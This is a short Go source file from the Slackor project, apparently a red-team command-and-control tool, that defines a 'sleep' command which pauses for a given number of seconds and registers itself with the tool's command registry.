package common

import (
	"errors"
	"strconv"
	"time"

	"github.com/Coalfire-Research/Slackor/pkg/command"
)

// Sleep pauses for N seconds
type Sleep struct{}

// Name is the name of the command
func (s Sleep) Name() string {
	return "sleep"
}

// Run pauses for N seconds
func (s Sleep) Run(clientID string, jobID string, args []string) (string, error) {
	if len(args) != 1 {
		return "", errors.New("sleep takes 1 argument")
	}
	sleeptime, _ := strconv.Atoi(args[0])
	time.Sleep(time.Duration(sleeptime) * time.Second)
	return "", nil
}

func init() {
	command.RegisterCommand(Sleep{})
}
